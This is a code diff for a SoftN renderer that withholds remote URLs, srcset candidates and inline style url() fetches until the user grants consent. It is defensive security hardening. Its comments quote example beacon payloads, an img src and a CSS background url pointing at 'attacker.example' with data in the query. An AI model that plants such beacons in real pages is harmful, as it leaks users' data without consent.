@@ -19,7 +19,13 @@ import type {
 } from '../parser/ast';
 import type { SoftNRenderContext, SoftNProps } from '../types';
 import { ComponentRegistry, SoftNComponent } from './registry';
-import { isSafeUrl, URL_ATTRIBUTES } from './sanitize-html';
+import {
+  hasRemoteSrcSetCandidate,
+  isRemoteUrl,
+  isSafeUrl,
+  rewriteCssUrls,
+  URL_ATTRIBUTES,
+} from './sanitize-html';
 
 // Maximum recursion depth for expression evaluation to prevent infinite loops
 const MAX_EVAL_DEPTH = 100;
@@ -394,7 +400,30 @@ const VOID_ELEMENTS = new Set([
 const URL_PROPS = new Set([
   ...URL_ATTRIBUTES,
   'xlinkHref', // React's camelCase spelling of xlink:href
+  // React's spelling of srcset, and the one an author is likelier to write.
+  // URL_ATTRIBUTES is the HTML list, so it only carries the lowercase form —
+  // `<img srcSet={…}>` reached the DOM with neither check in front of it.
+  'srcSet',
 ]);
+
+/**
+ * Whether a URL prop is egress that the user has not authorised yet.
+ *
+ * The consent bar withholds every softn.* capability until the user answers,
+ * but the bundle's own markup never went through softn.*: `<Image src="https://
+ * attacker.example/beacon?d=…">` renders a raw `<img src>`, and the browser
+ * fetches it on first paint. Under the modal that was unreachable by accident,
+ * because the app did not exist until Allow — this is what replaces the
+ * accident. A relative, `data:` or `blob:` source is not egress and is
+ * untouched, so a bundle's own images keep working with no capability at all.
+ *
+ * `srcset` gets its own reading because it is a list, not a URL.
+ */
+function isWithheldUrl(name: string, value: string, consentPending: boolean): boolean {
+  if (!consentPending) return false;
+  if (name === 'srcSet' || name === 'srcset') return hasRemoteSrcSetCandidate(value);
+  return isRemoteUrl(value);
+}
 
 /**
  * Drop unsafe URL props before they reach a raw HTML element.
@@ -402,11 +431,16 @@ const URL_PROPS = new Set([
  * Every name in `URL_PROPS` is safe to judge by name here, because on a raw
  * element it can only ever mean the URL the browser will fetch.
  */
-function sanitizeUrlProps(props: SoftNProps, tag: string): void {
+function sanitizeUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
   for (const name of Object.keys(props)) {
     if (!URL_PROPS.has(name)) continue;
     const value = props[name];
-    const safe = typeof value === 'string' ? (isSafeUrl(value) ? value : undefined) : value;
+    const safe =
+      typeof value === 'string'
+        ? isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)
+          ? value
+          : undefined
+        : value;
     if (safe === undefined && props[name] !== undefined) {
       if (isDevelopment) {
         console.warn(
@@ -416,6 +450,36 @@ function sanitizeUrlProps(props: SoftNProps, tag: string): void {
       delete props[name];
     }
   }
+}
+
+/**
+ * Withhold remote `url(...)` from an inline `style={{…}}`.
+ *
+ * `sanitizeBundleCSS` already rewrites remote `url()` in a bundle's style
+ * block; the inline style object is a second route to the identical fetch —
+ * `style={{ backgroundImage: "url(https://attacker.example/beacon)" }}` — and
+ * it had no check at all. Only the consent-pending case is handled here: what
+ * an inline style may load *after* the user allows is a separate question
+ * about what permission.json governs, and changing it silently would break
+ * bundles that legitimately point at a CDN.
+ *
+ * The object is copied rather than mutated: it may be the app's own state, and
+ * deleting from that would corrupt the state as well as the render.
+ */
+function withholdRemoteStyleUrls(props: SoftNProps, consentPending: boolean): void {
+  if (!consentPending) return;
+  const style = props.style;
+  if (typeof style !== 'object' || style === null || Array.isArray(style)) return;
+
+  let copy: Record<string, unknown> | null = null;
+  for (const [name, value] of Object.entries(style as Record<string, unknown>)) {
+    if (typeof value !== 'string' || !value.includes('url(')) continue;
+    const withheld = rewriteCssUrls(value, isRemoteUrl);
+    if (withheld === value) continue;
+    if (!copy) copy = { ...(style as Record<string, unknown>) };
+    copy[name] = withheld;
+  }
+  if (copy) props.style = copy;
 }
 
 /**
@@ -467,7 +531,12 @@ function isPlainObject(value: unknown): value is Record<string, unknown> {
  * these arrays and objects are the app's own state, so deleting a key in place
  * would corrupt the state as well as the render.
  */
-function scrubUrlsIn(value: unknown, depth: number, blocked: string[]): unknown {
+function scrubUrlsIn(
+  value: unknown,
+  depth: number,
+  blocked: string[],
+  consentPending: boolean
+): unknown {
   if (depth > MAX_SCRUB_DEPTH) return value;
 
   // Elements arriving as a prop were built by `renderElement`, which already
@@ -478,7 +547,7 @@ function scrubUrlsIn(value: unknown, depth: number, blocked: string[]): unknown 
   if (Array.isArray(value)) {
     let copy: unknown[] | null = null;
     for (let i = 0; i < value.length; i++) {
-      const next = scrubUrlsIn(value[i], depth + 1, blocked);
+      const next = scrubUrlsIn(value[i], depth + 1, blocked, consentPending);
       if (next !== value[i]) {
         if (!copy) copy = value.slice();
         copy[i] = next;
@@ -490,7 +559,7 @@ function scrubUrlsIn(value: unknown, depth: number, blocked: string[]): unknown 
   if (isPlainObject(value)) {
     let copy: Record<string, unknown> | null = null;
     for (const name of Object.keys(value)) {
-      const next = scrubUrlProp(name, value[name], depth + 1, blocked);
+      const next = scrubUrlProp(name, value[name], depth + 1, blocked, consentPending);
       if (next !== value[name]) {
         if (!copy) copy = { ...value };
         copy[name] = next;
@@ -502,21 +571,27 @@ function scrubUrlsIn(value: unknown, depth: number, blocked: string[]): unknown 
   return value;
 }
 
-function scrubUrlProp(name: string, value: unknown, depth: number, blocked: string[]): unknown {
+function scrubUrlProp(
+  name: string,
+  value: unknown,
+  depth: number,
+  blocked: string[],
+  consentPending: boolean
+): unknown {
   if (COMPONENT_URL_PROPS.has(name) && typeof value === 'string') {
-    if (isSafeUrl(value)) return value;
+    if (isSafeUrl(value) && !isWithheldUrl(name, value, consentPending)) return value;
     blocked.push(value);
     return undefined;
   }
-  return scrubUrlsIn(value, depth, blocked);
+  return scrubUrlsIn(value, depth, blocked, consentPending);
 }
 
 /** Drop unsafe URLs from the props of a registered component. */
-function sanitizeComponentUrlProps(props: SoftNProps, tag: string): void {
+function sanitizeComponentUrlProps(props: SoftNProps, tag: string, consentPending: boolean): void {
   const blocked: string[] = [];
 
   for (const name of Object.keys(props)) {
-    const next = scrubUrlProp(name, props[name], 0, blocked);
+    const next = scrubUrlProp(name, props[name], 0, blocked, consentPending);
     if (next !== props[name]) props[name] = next;
   }
 
@@ -881,11 +956,15 @@ function renderElement(
   // treats as a URL can be judged by name. A registered component gets the
   // narrower, unambiguous set instead, applied through the whole prop value
   // rather than only its top level.
+  const consentPending = context.consentPending === true;
   if (typeof FinalComponent === 'string') {
-    sanitizeUrlProps(props, node.tag);
+    sanitizeUrlProps(props, node.tag, consentPending);
   } else {
-    sanitizeComponentUrlProps(props, node.tag);
+    sanitizeComponentUrlProps(props, node.tag, consentPending);
   }
+  // Applies to both: a registered component that spreads `style` onto its root
+  // element reaches the network by exactly the same route a raw <div> does.
+  withholdRemoteStyleUrls(props, consentPending);
 
   // Void elements take no children, and React throws rather than ignoring the
   // argument — even for the empty array `renderNodes` returns for a childless
